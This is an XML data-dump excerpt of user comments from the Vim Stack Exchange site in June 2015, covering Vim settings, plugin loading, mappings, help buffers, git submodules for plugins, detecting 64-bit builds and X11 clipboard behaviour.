  <row Id="5216" PostId="3706" Score="0" Text="Brilliant; that totally did it! Do you do this for all settings in your `.vimrc`?" CreationDate="2015-06-26T06:12:37.193" UserId="2593" />
  <row Id="5217" PostId="3706" Score="0" Text="@RyanLue This trick is mostly useful for string-valued options, or when saving / restoring options in scripts.  I don't bother with it otherwise." CreationDate="2015-06-26T06:19:09.300" UserId="1577" />
  <row Id="5218" PostId="3698" Score="0" Text="Thanks @PeterRincker, I've added that to the answer." CreationDate="2015-06-26T09:00:47.400" UserId="51" />
  <row Id="5219" PostId="2770" Score="0" Text="@Badger Glad to hear it. :)" CreationDate="2015-06-26T09:35:43.253" UserId="343" />
  <row Id="5220" PostId="3714" Score="0" Text="Sorry about that. I suggest you make this a community wiki or simply convert it to a GitHub gist and add a link." CreationDate="2015-06-26T14:31:43.953" UserId="1262" />
  <row Id="5221" PostId="3714" Score="0" Text="No need to be sorry for that. I'm not sure making it a gist would be really useful since I think a lot of people wrote [better](http://usevim.com/2012/07/18/nerdtree/) [stuff](http://code.tutsplus.com/tutorials/vim-essential-plugin-nerdtree--net-19692) than is answer. :-)" CreationDate="2015-06-26T14:38:15.183" UserId="1841" />
  <row Id="5223" PostId="3716" Score="0" Text="I think you want `&lt;C-w&gt;o`? (also see: [How to “full screen” browse Vim help?](http://vi.stackexchange.com/q/358/51))." CreationDate="2015-06-26T15:08:48.007" UserId="51" />
  <row Id="5224" PostId="3716" Score="0" Text="Erf how could have I not find this? (Maybe this question should be marked as duplicate actually) That's exactly what I want thanks. But is it normal that when I'm on an help buffer, I do `:bn` to go back to my previous buffer that close the help buffer (it doesn't appear anymore in `:ls`)?" CreationDate="2015-06-26T15:15:17.633" UserId="1841" />
  <row Id="5225" PostId="3620" Score="0" Text="@lcd047 You *can* actually share your knowledge, by asking a asking *and* answering your own question. This will also encourage *other* people to share *their* knowledge on the subject by providing alternative (perhaps better?) solutions. Everybody wins! Also [see my answer in the meta post](http://meta.vi.stackexchange.com/a/1282/51)." CreationDate="2015-06-26T15:27:51.240" UserId="51" />
  <row Id="5226" PostId="3624" Score="0" Text="Also see: [What's the simplest way to strip trailing whitespace from all lines in a file?](http://vi.stackexchange.com/q/454/51). You should perhaps add this as an answer there (although this is pretty much the same to the ones already posted I think?)" CreationDate="2015-06-26T15:29:54.353" UserId="51" />
  <row Id="5227" PostId="3625" Score="0" Text="Also see: [Re-indenting badly indented code](http://vi.stackexchange.com/q/236/51). You should perhaps add this as an answer there." CreationDate="2015-06-26T15:31:18.083" UserId="51" />
  <row Id="5228" PostId="3626" Score="0" Text="Note that this will clobber your `c` and `h` marks :-) Also see: [What's the simplest way to strip trailing whitespace from all lines in a file?](http://vi.stackexchange.com/q/454/51). You should perhaps add this as an answer there (although this is pretty much the same to the ones already posted I think?)" CreationDate="2015-06-26T15:32:43.337" UserId="51" />
  <row Id="5229" PostId="3719" Score="2" Text="I can't recommend this enough.  Always look for solutions that vim has by default before looking for plugins." CreationDate="2015-06-26T17:09:15.890" UserId="865" />
  <row Id="5230" PostId="3725" Score="4" Text="[This post](http://stackoverflow.com/a/4571319/1658042) explains how to rotate windows.  [This](http://stackoverflow.com/questions/1269603/to-switch-from-vertical-split-to-horizontal-split-fast-in-vim) is about switching splits from vertical to horizontal." CreationDate="2015-06-27T05:51:55.163" UserId="1577" />
  <row Id="5231" PostId="3725" Score="0" Text="@lcd047 Those are questions outside of this site. Is it worth writing a small answer here and include the links (which are valuable)?" CreationDate="2015-06-27T06:02:24.857" UserId="66" />
  <row Id="5232" PostId="3725" Score="1" Text="@Bernhard I suppose this is a good question for [meta](http://meta.vi.stackexchange.com/)." CreationDate="2015-06-27T06:05:26.953" UserId="1577" />
  <row Id="5234" PostId="3725" Score="0" Text="@Bernhard [Yes](http://meta.vi.stackexchange.com/questions/45/what-do-we-do-with-questions-that-are-already-answered-somewhere-else-on-se). Make sure to write a complete answer, not just links." CreationDate="2015-06-27T10:45:41.600" UserId="8" />
  <row Id="5235" PostId="3726" Score="0" Text="What encoding and fileencoding are you using?" CreationDate="2015-06-27T11:56:43.663" UserId="1430" />
  <row Id="5236" PostId="3727" Score="1" Text="Unfortunately I'm not in control of all the places such regular expressions are used. Any number of plugins make use of `\w` and hence they all fall down when it comes to this. Rather than patching every since one (if I can even track down the culprits) it would be easier for me to patch vim so that `\w` works. Bah." CreationDate="2015-06-27T12:20:49.917" UserId="267" />
  <row Id="5237" PostId="3726" Score="0" Text="@cxw `utf-8` across the board. And yes it is set in both those settings." CreationDate="2015-06-27T12:22:42.787" UserId="267" />
  <row Id="5238" PostId="3725" Score="0" Text="@lcd047 i know how to do both. but those actions are window wise. i don't know how to do in within a split." CreationDate="2015-06-27T12:36:50.253" UserId="1097" />
  <row Id="5239" PostId="3725" Score="0" Text="Then please explain what you're trying to do and why the two answers I pointed you to don't address the problem." CreationDate="2015-06-27T12:51:40.197" UserId="1577" />
  <row Id="5240" PostId="3725" Score="0" Text="@lcd047 as i said, you want to swap two windows within a split, not a window. i checked `help wincmd`, seems no help." CreationDate="2015-06-27T13:18:12.213" UserId="1097" />
  <row Id="5242" PostId="3728" Score="1" Text="Use mappings to `wincmd`&#xA;&#xA;For example you can map:&#xA;&#xA;`:nmap wj :wincmd j&lt;cr&gt;` it's acts same as `CTRL-W j` (move to window below).&#xA;&#xA;`:help wincmd`" CreationDate="2015-06-27T14:06:06.993" UserId="1145" />
  <row Id="5243" PostId="3726" Score="1" Text="You've tagged this question as [tag:neovim]. I would suggest you open an issue in the NeoVim issue tracker, if there isn't one already. This probably won't be fixed in the short-term, but will be down the line... You can also try posting a message to vim_dev about this, but I suspect everyone will agree that something needs to be done, after which nothing changes." CreationDate="2015-06-27T14:15:06.180" UserId="51" />
  <row Id="5244" PostId="3729" Score="0" Text="Solves my problem. Added the mapping to my vimrc and tested a bit with no issues." CreationDate="2015-06-27T14:16:09.043" UserId="2612" />
  <row Id="5245" PostId="3728" Score="0" Text="@AlexKroll Why don't you post that as an answer? :-)" CreationDate="2015-06-27T14:16:20.993" UserId="51" />
  <row Id="5246" PostId="3728" Score="0" Text="@Carpetsmoker It's not full cover for this problem I think. `CTRL-W j` works with counters (go to n-th window below from current) my solution does not." CreationDate="2015-06-27T14:22:17.610" UserId="1145" />
  <row Id="5247" PostId="3731" Score="0" Text="Sadly this is not true.  `&amp;runtimepath` is manipulated by plugin managers, there is absolutely no reason for it to start with `$HOME/.vim` or with `$HOME\vimfiles`." CreationDate="2015-06-27T16:34:36.130" UserId="1577" />
  <row Id="5248" PostId="3731" Score="0" Text="@lcd047, in its default state, `&amp;runtimepath` always start with the default user-level runtime directory for the current platform. Now, it is obviously possible for the user to butcher his `'rtp'` beyond recognition but AFAIK pathogen, vundle, plug, VAM and neobundle *all* leave `~/.vim` (or similar) at the beginning." CreationDate="2015-06-27T17:19:24.570" UserId="54" />
  <row Id="5249" PostId="3734" Score="0" Text="Why separate between the `autoload/` and `plugin/` directories? I've always put everything in `plugin/` and that seems to work fine?" CreationDate="2015-06-27T17:30:33.097" UserId="51" />
  <row Id="5250" PostId="3734" Score="1" Text="The autoload directory only loads it's contents when needed.  This can speed up the start time of vim somewhat.  In other words, it works about the same as `plugin/` except it is only loaded once it is needed instead of being loaded on startup." CreationDate="2015-06-27T17:33:01.700" UserId="865" />
  <row Id="5251" PostId="3731" Score="0" Text="Only with the default configuration.  For a long time I used something like this: `pathogen#infect(&quot;$VIM/local/bundle/{}&quot;)`, to allow me to (1) have bundles available to all users, (2) keep them separate from Vim's main runtime, and (3) allow me to upgrade them automatically.  `~/.vim` ends up in the middle of the bunch with that setup." CreationDate="2015-06-27T18:25:24.707" UserId="1577" />
  <row Id="5252" PostId="3734" Score="2" Text="@Carpetsmoker Pretty much as @EvergreenTree said.  Of course, it doesn't really matter for &quot;small&quot; plugins, but it's still good practice.  With Vim you have very little control on the garbage collector, and loading things only when and if they are needed can make a difference.  On the other hand, there are subtle downsides to moving everything to `autoload`, f.i. you can't test for the existence of a function if the file it lives in hasn't been loaded." CreationDate="2015-06-27T18:34:58.307" UserId="1577" />
  <row Id="5253" PostId="3728" Score="2" Text="I don't normally appreciate advice like this, but I would look for another terminal. `&lt;C-W&gt;` is too useful a shortcut (not only in many places in Vim, but also in bash) to forfeit. I'd be curious what other key bindings are consumed by the terminal -- `&lt;C-T&gt;`? At the very least, I'd look into whether these are configurable in the terminal." CreationDate="2015-06-27T19:38:01.903" UserId="64" />
  <row Id="5254" PostId="3731" Score="0" Text="@lcd047, I changed the wording of the first sentence as per our conversation." CreationDate="2015-06-27T20:40:10.757" UserId="54" />
  <row Id="5255" PostId="3738" Score="0" Text="Note you can just use `:hi comment gui=bold cterm=bold`, no need for the `if` statement here." CreationDate="2015-06-28T00:03:55.997" UserId="51" />
  <row Id="5258" PostId="3742" Score="0" Text="These need a g along with the n in order to make them global (otherwise, they only match one word per line). The second one also needs an s at the beginning." CreationDate="2015-06-28T00:29:47.770" UserId="648" />
  <row Id="5259" PostId="3741" Score="0" Text="I had found something like this while searching, but missed that the first g is part of the counting command, not a location specifier. This solution makes sense now. I apparently should also read up on Visual mode; I don't use it often enough." CreationDate="2015-06-28T00:31:28.623" UserId="648" />
  <row Id="5260" PostId="3742" Score="1" Text="Fixed, sorry about that." CreationDate="2015-06-28T00:32:55.927" UserId="865" />
  <row Id="5261" PostId="3743" Score="0" Text="Ah, I figured there would be some way of getting the state of the `cterm` or `gui` attributes." CreationDate="2015-06-28T00:35:27.420" UserId="865" />
  <row Id="5262" PostId="3743" Score="0" Text="Nice! Thanks. But I think nomap is wrong. Can you correct it please? I dont know which map command I would want to use here." CreationDate="2015-06-28T00:37:46.943" UserId="2620" />
  <row Id="5263" PostId="3742" Score="1" Text="Using `\w` sounds like a nice idea at first, but after testing it I found a number of problems. The biggest is that it won't match non-ascii characters, so a word like `über` is simply skipped (there was a [question about this](http://vi.stackexchange.com/q/3726/51) yesterday). Also, a word like `e-mail` is counted as 2 words, since `-` is not in `\w` (using a `-` is somewhat uncommon in English, but very common in Dutch for example). There may be other characters which are ignored in this fashion, which brings us to my last point: conventions as to what is considered a &quot;word&quot; may differ ..." CreationDate="2015-06-28T00:43:17.810" UserId="51" />
  <row Id="5264" PostId="3742" Score="0" Text="... in various languages, and &quot;proper&quot; tools like `wc` may pick up on the locale (I don't know if GNU `wc` actually deals with this by the way, GNU tools are not well known for their excellent unicode support)." CreationDate="2015-06-28T00:43:21.837" UserId="51" />
  <row Id="5265" PostId="3742" Score="0" Text="That is interesting.  I might add that as a plus to the `wc` solution." CreationDate="2015-06-28T00:44:52.240" UserId="865" />
  <row Id="5266" PostId="3743" Score="0" Text="@Mike Oops, sorry, I meant to use `noremap`, which is the same as `map` but non-recursive. See [Learn VimScript the Hard way](http://learnvimscriptthehardway.stevelosh.com/chapters/03.html) chapters 3 through 5 (especially chapter 5) to learn why you should always use `noremap` and never `map`." CreationDate="2015-06-28T00:46:19.407" UserId="51" />
  <row Id="5267" PostId="3741" Score="1" Text="I had no idea that you could use `g&lt;C-g&gt;` that way.  Awesome!" CreationDate="2015-06-28T00:48:12.840" UserId="865" />
  <row Id="5268" PostId="3742" Score="0" Text="At least on my system (cygwin, in the US), the vimscript method gave me the same result as running wc from from the command line. The file I tested it on has a few hyphenated words, and no non-ascii characters. Being off by a couple of words is close enough for my immediate purposes, but that's a good gotcha to keep in mind." CreationDate="2015-06-28T02:33:47.337" UserId="648" />
  <row Id="5269" PostId="3748" Score="0" Text="Beautiful! Curious: what happens if I modify a file so opened?" CreationDate="2015-06-28T02:34:38.060" UserId="205" />
  <row Id="5270" PostId="3748" Score="1" Text="@muru You will notice that the buffer is opened up in a read only buffer (probably notice an `[RO]` in the status line)." CreationDate="2015-06-28T02:38:24.570" UserId="778" />
  <row Id="5271" PostId="3748" Score="0" Text="yep, it's there." CreationDate="2015-06-28T02:42:46.583" UserId="205" />
  <row Id="5272" PostId="3749" Score="0" Text="And can I get it to detect filetype, syntax, etc. automatically with this method?" CreationDate="2015-06-28T02:44:26.460" UserId="205" />
  <row Id="5273" PostId="3749" Score="0" Text="Sadly not without some more work; I updated the post" CreationDate="2015-06-28T02:45:00.717" UserId="227" />
  <row Id="5274" PostId="3749" Score="1" Text="I do recommend using the plugin method from @PeterRinker's post if you can. It should do a lot of the nice things you'd like. I mostly wanted to show that one needn't leave the editor nor deal with the hassles of piping to get the data, and I know that there are some people who hate having to use plugins." CreationDate="2015-06-28T02:57:28.470" UserId="227" />
  <row Id="5275" PostId="3749" Score="1" Text="I just added a bit to be able to detect filetype. It is no longer something you'd want to just type on-the-fly, but could work as an easy addition to a .vimrc. Using a specific plugin will still probably work better." CreationDate="2015-06-28T03:22:33.357" UserId="227" />
  <row Id="5276" PostId="3749" Score="0" Text="You might want to look into using `:file` to name your file instead of having a temporary file. See `:h :file`" CreationDate="2015-06-28T05:06:42.607" UserId="778" />
  <row Id="5277" PostId="3749" Score="0" Text="@PeterRincker excellent suggestion! I'll try it and update in a bit. I had actually checked `:help :file` when I was writing the post, but my version of Vim (7.4 on Ubunut 14.04) only says `:file` prints the filename and additional info (like ctrl-g), not mentionaing anything about it changing the filename if given an argument. Just now found that tidbit under `:help :file_f`  :-)" CreationDate="2015-06-28T05:12:40.730" UserId="227" />
  <row Id="5278" PostId="3731" Score="0" Text="Did it for me, and strikes me as the most elegant solution, given my setup. Thanks!!" CreationDate="2015-06-28T05:38:09.913" UserId="2593" />
  <row Id="5279" PostId="3692" Score="0" Text="One simple way to change $TERM variable in gonome-terminal http://superuser.com/a/870547/424027&#xA;gnome-terminal has no settings for this." CreationDate="2015-06-28T06:06:44.917" UserId="1145" />
  <row Id="5280" PostId="3733" Score="0" Text="If you decide to take &quot;definition search&quot; for a ride, you'll probably find [this plugin of mine](https://github.com/romainl/vim-qlist) handy." CreationDate="2015-06-28T08:39:42.907" UserId="54" />
  <row Id="5281" PostId="3751" Score="0" Text="Does this also happen in you start Vim with no vimrc file (`vim -u NONE`)?" CreationDate="2015-06-28T11:11:19.543" UserId="51" />
  <row Id="5282" PostId="3747" Score="0" Text="If I'm understanding correctly, you're saying the entire file isn't sourced &amp; executed prior to the execution of the function call defined in my vimrc? Maybe I'm misunderstanding ... but it seems to me the entire autoload script is sourced &amp; executed first.  If I add a the statement `echom 'this is the function call'` in the function being called from vimrc and another `echom 'file was sourced'` anywhere else in the file (not in a function), I see the latter first, then the former." CreationDate="2015-06-28T12:04:08.880" UserId="2207" />
  <row Id="5283" PostId="3747" Score="0" Text="Sorry, I just realized what you're saying - and that you're correct. Since the function call is happening in the script  as it is sourced, it needs to happen after the function is defined. Thank you!" CreationDate="2015-06-28T12:05:39.977" UserId="2207" />
  <row Id="5284" PostId="2710" Score="0" Text="Note that `autoread` is rather limited; it only checks if the file is changed when certain events occur. [Also see my answer here](http://vi.stackexchange.com/a/2731/51)." CreationDate="2015-06-28T12:17:26.510" UserId="51" />
  <row Id="5285" PostId="3752" Score="1" Text="Even though I don't know of a way of converting markdown to vim's help file type, I do know of a good introduction to writing them: http://learnvimscriptthehardway.stevelosh.com/chapters/54.html" CreationDate="2015-06-28T12:46:47.183" UserId="865" />
  <row Id="5286" PostId="3751" Score="0" Text="Nope... so this is an issue in my vimrc, right?" CreationDate="2015-06-28T12:51:27.537" UserId="2627" />
  <row Id="5287" PostId="3751" Score="1" Text="Looks like it :-) try: [How do I debug my vimrc file?](http://vi.stackexchange.com/q/2003/51) and post the settings that cause this behaviour." CreationDate="2015-06-28T13:08:22.187" UserId="51" />
  <row Id="5288" PostId="3751" Score="0" Text="it seems that was a bug in the version i had in vim-airline.  I followed the posts instructions on how to debug my vimrc, i commented out the plugins and everything worked ok.  So i started commenting out one by one each plugin, and when i did so in vim-airline it bugged again.  So i found out how to update my plugins (vim +PluginUpdate) and now everything works ok.  Thnx @Carpetsmoker." CreationDate="2015-06-28T13:59:13.803" UserId="2627" />
  <row Id="5290" PostId="3753" Score="0" Text="It sounds like you're using vundle as your plugin manager. If so, you can also update your plugins from within an existing vim session with the `:PluginUpdate` command." CreationDate="2015-06-28T15:49:06.627" UserId="2618" />
  <row Id="5291" PostId="3589" Score="0" Text="You can just use `&lt;Esc&gt;`, you don't need to use `&lt;C-c&gt;`. The difference is that `&lt;C-c&gt;` aborts whatever Vim is doing (such as running a function), and `&lt;Esc&gt;` doesn't. You almost never want to use `&lt;C-c&gt;` unless you want to &quot;kill&quot; something." CreationDate="2015-06-28T16:40:10.640" UserId="51" />
  <row Id="5292" PostId="3583" Score="1" Text="You can use `set showcmd` to show the keys you've typed in the bottom-right corner." CreationDate="2015-06-28T16:40:52.083" UserId="51" />
  <row Id="5293" PostId="3753" Score="0" Text="this is true, i will update my answer regarding this." CreationDate="2015-06-28T18:27:07.190" UserId="2627" />
  <row Id="5295" PostId="3755" Score="1" Text="This is really [the same problem as this question](http://vi.stackexchange.com/q/365/51); in my answer I've written a (markdown-specific) workaround, but it's ugly and has a number of side-effects..." CreationDate="2015-06-28T22:46:51.987" UserId="51" />
  <row Id="5296" PostId="3712" Score="0" Text="This is pretty cool. Thanks." CreationDate="2015-06-29T04:09:30.923" UserId="1262" />
  <row Id="5299" PostId="3756" Score="1" Text="I'm pretty sure you want to at least change `if &amp;term == &quot;^xterm&quot;` to `if &amp;term =~ &quot;^xterm&quot;` and `&amp;term =~ &quot;^screen&quot;` Changing this makes it work in `xterm` and `xterm`+`tmux` for me. I commented out the second part as this changed my terminal's font(!). Didn't test all the other terminals." CreationDate="2015-06-29T08:24:11.580" UserId="51" />
  <row Id="5300" PostId="3756" Score="0" Text="It looks like the `tmux` part is sending Escape code 50 (`&lt;Esc&gt;]50`), which is a OSX specific thing. See: [Escape code 50 in xterm](http://unix.stackexchange.com/q/152369/33645)." CreationDate="2015-06-29T08:27:18.533" UserId="51" />
  <row Id="5301" PostId="3756" Score="0" Text="http://vi.stackexchange.com/a/3456/1145&#xA;Very similar." CreationDate="2015-06-29T08:58:09.263" UserId="1145" />
  <row Id="5302" PostId="3756" Score="1" Text="You can try the [togglecursor plugin](https://github.com/jszakmeister/vim-togglecursor). Not sure if it works with cygwin, though. I'd recommend skimming over the help file for more info on what terminals are supported." CreationDate="2015-06-29T09:49:02.510" UserId="20" />
  <row Id="5303" PostId="3758" Score="0" Text="and then? how do i proceed? how do i fetch the data from the submodules to my local folder?" CreationDate="2015-06-29T11:46:07.977" UserId="2627" />
  <row Id="5304" PostId="3758" Score="0" Text="@h1k3n O.o That's what those commands are for. `git submodule update --init` should clone the Vundle repository." CreationDate="2015-06-29T11:48:06.777" UserId="205" />
  <row Id="5305" PostId="3758" Score="0" Text="i feel lost.  let me revisit this in the afternoon when i cool my head as it has been a tough day here in Greece. Thnx though, it seems that this topic stepped in a black area for me in git (submodules) that i need to explore." CreationDate="2015-06-29T11:51:18.780" UserId="2627" />
  <row Id="5306" PostId="3717" Score="0" Text="Thanks for your answer and sorry for my late comment! First: your method seems to be more reliable than mine combined with the comment of CarpetSmoker (using `&lt;C-w&gt;o`) but I haven't tested it yet in full depth. Secondly I have a question: with you method just like with mine, the help buffer seems to disapear (just like I described it in the comment on my question), is it an expected behavior? And if so is it possible to get rid of it so I can open an help buffer and then switch between it and my others buffers?" CreationDate="2015-06-29T15:14:12.200" UserId="1841" />
  <row Id="5307" PostId="3717" Score="0" Text="Help buffers are unlisted so they do not show up in `:ls` or navigable via simple `:bn`/`:bp` commands. To see unlisted buffers do `:ls!`. Now if you use `&lt;c-^&gt;`/`&lt;c-6&gt;` you can easily switch between the current buffer and the alternative buffer. I remap this command to backspace via `nnoremap &lt;bs&gt; &lt;c-^&gt;` to make switching easier. If you really want to switch between the buffers you can do `set buflisted` around line 7 of the function, but that will clutter up your buffer list." CreationDate="2015-06-29T15:40:49.203" UserId="778" />
  <row Id="5308" PostId="2118" Score="0" Text="This works for me most of the time (so I'm upvoting), however I tend to hit `:w` habitually whenever I pause for a while, so if I've been working on a file most of the day and only want to undo stuff from the last session of edits, it's quite tricky to use `:earlier`. Normally in this case I just look at my undo tree with gundo and find the right spot that way." CreationDate="2015-06-29T15:54:56.623" UserId="1094" />
  <row Id="5309" PostId="3717" Score="0" Text="I think the `&lt;c-^&gt;/&lt;c-6&gt;` trick is what I was looking for, and I'll probably remap it too because on my azerty keyboard it's absolutely not convenient. Thank you for these additionnal informations!" CreationDate="2015-06-29T15:56:52.010" UserId="1841" />
  <row Id="5310" PostId="3716" Score="0" Text="@Carpetsmoker: I just accepted Peter's answer, but could you make your solution an answer? It is what I was looking for on the beginning and it solve my problem so I think that is worth an answer :)" CreationDate="2015-06-29T15:59:24.353" UserId="1841" />
  <row Id="5311" PostId="3565" Score="1" Text="Thanks for the great answer, @akshay; TYLTK it's up with the very best: http://vi.stackexchange.com/search?tab=votes&amp;q=is%3Aa#answer-id-242" CreationDate="2015-06-29T16:40:09.277" UserId="2221" />
  <row Id="5313" PostId="3672" Score="0" Text="I believe what NeoVim wants to achieve is a VimScript to Lua transpiler, so they can use the LuaJIT runtime. So I'm wondering if the Lua engine is already integrated anywhere..." CreationDate="2015-06-29T20:34:32.847" UserId="2554" />
  <row Id="5314" PostId="3760" Score="0" Text="I can confirm that the `togglebg` doesn't work very well in `xterm` (although it works fine for me in gVim)..." CreationDate="2015-06-29T22:54:12.503" UserId="51" />
  <row Id="5315" PostId="3760" Score="0" Text="Possibly related: http://vi.stackexchange.com/questions/1890/why-does-the-order-of-set-bg-dark-and-set-bg-light-matter#comment1157_1891" CreationDate="2015-06-30T01:55:42.180" UserId="205" />
  <row Id="5317" PostId="3758" Score="0" Text="I used those commands but they show no output and at the end i have only the folders of each submodule (maybe they aren't submodules in my case after all?).  I think i have made a mistake in the initialization of the process." CreationDate="2015-06-30T06:26:30.577" UserId="2627" />
  <row Id="5318" PostId="3758" Score="0" Text="@h1k3n Guess I was wrong - when you added the bundle directory, the plugin directories *didn't* become proper submodules, but only git links. See http://stackoverflow.com/a/4162672/2072269. Essentially, in your original repo, do `git rm --cached` for the plugin directories, then re-add them as submodules." CreationDate="2015-06-30T06:35:56.690" UserId="205" />
  <row Id="5320" PostId="3762" Score="0" Text="How about the `$MACHTYPE` environment variable? I'm not sure how portable that is, though, but at least `tcsh` and `bash` seem to set it." CreationDate="2015-06-30T07:48:03.710" UserId="51" />
  <row Id="5321" PostId="3762" Score="0" Text="@Carpetsmoker hmmm... What if you have 32-bit vim on a 64-bit system? (Say, `sudo apt-get install vim:i386` on a 64-bit Ubuntu)" CreationDate="2015-06-30T07:49:43.717" UserId="205" />
  <row Id="5322" PostId="3762" Score="0" Text="Yeah, it would only check what the host system's using, not how Vim is compiled... Also a small caveat about your answer: it doesn't necessarily check the Vim binary you're running, but rather the 'default' Vim (which may be a different binary)." CreationDate="2015-06-30T07:54:07.797" UserId="51" />
  <row Id="5323" PostId="3762" Score="0" Text="@Carpetsmoker how about the update?" CreationDate="2015-06-30T08:07:50.770" UserId="205" />
  <row Id="5324" PostId="3762" Score="0" Text="Sorry for the spam, but you can use this to get the path to the current binary: `resolve('/proc/' . getpid() . '/exe')` ... Should work on most Unix-y systems which have a `/proc`" CreationDate="2015-06-30T08:07:51.143" UserId="51" />
  <row Id="5325" PostId="3762" Score="0" Text="@Carpetsmoker yes, the `/proc/$PID/exe` should be safer in case the running binary got deleted or replaced." CreationDate="2015-06-30T08:14:50.310" UserId="205" />
  <row Id="5326" PostId="3762" Score="0" Text="Wow, that's more complicated than expected. The first two approaches work, but I don't understand how I could use the &quot;within-vim-way&quot;: I tried putting this into the vimrc or executing it directly..." CreationDate="2015-06-30T08:17:56.617" UserId="2645" />
  <row Id="5327" PostId="3762" Score="0" Text="If it helps: Vim ist telling me: `E121: Undefined variable: v:progpath`" CreationDate="2015-06-30T08:20:47.543" UserId="2645" />
  <row Id="5328" PostId="3762" Score="0" Text="@caligula if you put that in vimrc as-si, you would get `yes`  then `Press Enter or type command to continue` when you start a 64-bit vim. (At least, I do.) It all depends on why you want to know this. As I understand it, the APIs on Windows change depending on whether you have win64 or win32 or something else, that's why they have that check. APIs on Linux usually don't change because you have 32-bit or 64-bit." CreationDate="2015-06-30T08:21:05.843" UserId="205" />
  <row Id="5329" PostId="3762" Score="0" Text="@caligula if that's the case `v:progpath` must have been introduced in Vim 7.4. Try Carpetsmoker's test: `if system('file &quot;' . resolve('/proc/' . getpid() . '/exe') . '&quot;') =~ &quot;64-bit&quot; ...`" CreationDate="2015-06-30T08:22:26.073" UserId="205" />
  <row Id="5330" PostId="3762" Score="0" Text="Ok, had some trouble I can't reproduce, but it's working now anyways :) Thx" CreationDate="2015-06-30T08:36:36.413" UserId="2645" />
  <row Id="5331" PostId="3761" Score="3" Text="Out of curiosity, why is that information important for you?" CreationDate="2015-06-30T08:37:46.843" UserId="54" />
  <row Id="5332" PostId="3763" Score="0" Text="If `readfile` supports reading from symlinks, then read directly from `/proc/$PID/exe`. I'm not sure how `resolve` will behave with deleted commands." CreationDate="2015-06-30T08:39:43.763" UserId="205" />
  <row Id="5333" PostId="3761" Score="1" Text="Because I'm trying to open a large file (5.1GB)" CreationDate="2015-06-30T08:42:16.263" UserId="2645" />
  <row Id="5334" PostId="3761" Score="0" Text="@caligula might be useful: http://vi.stackexchange.com/questions/149/how-can-i-open-very-large-files-with-good-performance" CreationDate="2015-06-30T08:53:58.187" UserId="205" />
  <row Id="5335" PostId="3761" Score="0" Text="Yes thanks, I'm actually already using that (including the linked stuff), but I'm still having problems. Perhaps I'll soon be able to ask a question, but for now I'm still trying..." CreationDate="2015-06-30T09:09:22.733" UserId="2645" />
  <row Id="5336" PostId="3761" Score="0" Text="ANd you are trying to open a 5.1 GB file for *editing* or for *viewing*? If the latter, why not use a pager instead? Or some grep/sed before sending to Vim?" CreationDate="2015-06-30T09:24:06.743" UserId="54" />
  <row Id="5337" PostId="3761" Score="0" Text="Unfortunately it's the former ;) Question is incoming :/" CreationDate="2015-06-30T09:29:30.787" UserId="2645" />
  <row Id="5338" PostId="3761" Score="1" Text="`-I/usr/lib/x86_64-linux-gnu/...` - those are 64-bit includes." CreationDate="2015-06-30T10:08:45.887" UserId="1577" />
  <row Id="5339" PostId="3763" Score="1" Text="Once you reference `/proc` that way it isn't &quot;pure Vim&quot;, it's &quot;Linux Vim&quot;. :)" CreationDate="2015-06-30T10:09:59.963" UserId="1577" />
  <row Id="5340" PostId="3763" Score="0" Text="@lcd047 sort of but not really. `procfs` predates Linux by a decade, many systems have it. Linux did extend it heavily, and &quot;as expected&quot; in the world of Unix different implementations are not compatible ([`/proc/&lt;pid&gt;/path`](http://docs.oracle.com/cd/E23824_01/html/821-1473/proc-4.html#REFMAN4proc-4),&#xA;[`/proc/&lt;pid&gt;/file`](http://www.freebsd.org/cgi/man.cgi?query=procfs&amp;apropos=0&amp;sektion=0&amp;manpath=FreeBSD+10.1-RELEASE&amp;arch=default&amp;format=html))... Some systems may not have it, but making *anything* truly Unix-wide compatible without explicitly coding it (`#ifdef` etc.) is damn near impossible." CreationDate="2015-06-30T10:21:57.690" UserId="51" />
  <row Id="5346" PostId="3767" Score="0" Text="Add it to `~/.vim/syntax`?" CreationDate="2015-06-30T12:16:42.600" UserId="205" />
  <row Id="5350" PostId="3769" Score="0" Text="@Carpetsmoker, I meant *X11's buffers*, not *Vim's registers*, but this will do as well." CreationDate="2015-06-30T14:04:30.473" UserId="205" />
  <row Id="5351" PostId="3769" Score="0" Text="AFAIK for the `*` register at least (middle click), this is expected. As X does a request to the application with the last selection to get the contents." CreationDate="2015-06-30T14:04:40.630" UserId="51" />
  <row Id="5352" PostId="3769" Score="0" Text="@Carpetsmoker that seems to be the case. Any idea for `+`?" CreationDate="2015-06-30T14:05:23.690" UserId="205" />
  <row Id="5353" PostId="3769" Score="0" Text="Looks like it. See [here](https://bugs.launchpad.net/ubuntu/+bug/11334) and  [here](https://bugs.launchpad.net/ubuntu/+bug/106644)... I believe the answer to this is using something like [Parcellite](http://parcellite.sourceforge.net/), although I've found that these apps often come with their own problems and quircks..." CreationDate="2015-06-30T14:13:44.457" UserId="51" />
  <row Id="5354" PostId="3769" Score="0" Text="@muru The third comment to the second post you linked to explains what's going on: _[The] process is the following: 1. You copy text. 2. Vim tells X that it has data for clipboard («tells that it has data», not «puts data into clipboard»). 3. You exit vim. 4. X now has no idea where he can get data for clipboard: clipboard is «cleared»_" CreationDate="2015-06-30T14:24:32.547" UserId="1577" />
  <row Id="5355" PostId="3769" Score="0" Text="@lcd047 I read that. So how do I get it to *«puts data into clipboard»*, as they say?" CreationDate="2015-06-30T14:26:08.037" UserId="205" />
  <row Id="5356" PostId="3769" Score="0" Text="@muru: The next comment to the same post outlines a possible workaround: _create a daemon that when something tells X that it (something) has data for clipboard will obtain this data and in turn tell X that it (daemon) has this data. In this case when something exits, daemon will still be present and able to give this data. Search for «clipboard manager» in your repository, it should solve this issue_." CreationDate="2015-06-30T14:28:19.433" UserId="1577" />
  <row Id="5357" PostId="3769" Score="0" Text="@lcd047 &quot;... without using an external utility&quot;" CreationDate="2015-06-30T14:28:49.243" UserId="205" />
  <row Id="5358" PostId="3769" Score="0" Text="... Then you're opposing to solving your own problem. :) Really, Vim can't do that on its own." CreationDate="2015-06-30T14:30:52.353" UserId="1577" />
  <row Id="5359" PostId="3767" Score="1" Text="The version in `/usr/share/vim/vim74/syntax` is by &quot;Dr. Chip&quot; too.  It's just an older version of the file." CreationDate="2015-06-30T14:31:51.207" UserId="15" />
  <row Id="5360" PostId="3769" Score="0" Text="On a side note: ZyX used to be one of the main Vim developers (he seems more interested in neovim these days, although he still posts patches for Vim occasionally)." CreationDate="2015-06-30T14:33:31.273" UserId="1577" />
